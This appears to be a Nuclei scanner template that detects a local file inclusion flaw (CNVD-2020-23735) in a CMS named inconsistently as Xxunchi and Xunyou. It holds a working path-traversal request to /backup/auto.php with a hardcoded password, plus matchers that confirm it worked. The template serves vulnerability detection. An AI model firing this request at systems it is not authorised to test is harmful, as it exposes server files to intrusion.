id: CNVD-2020-23735
info:
  name: Xxunchi CMS - Local File Inclusion
  author: princechaddha
  severity: high
  description: Xunyou CMS has a vulnerability (CNVD-2020-23735) that allows attackers
    to access sensitive information through local file inclusion.
  reference:
  - https://www.cnvd.org.cn/flaw/show/2025171
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  tags: xunchi,lfi,cnvd,cnvd2020
  metadata:
    impact: The impact of CNVD-2020-23735 on Xunyou CMS is the potential access by
      attackers to sensitive information through local file inclusion vulnerabilities.
    recommendation: I recommend immediately updating Xunyou CMS to mitigate the local
      file inclusion vulnerability and protect sensitive information.
requests:
- method: GET
  path:
  - '{{BaseURL}}/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php'
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - NzbwpQSdbY06Dngnoteo2wdgiekm7j4N
    - display_errors
    condition: and
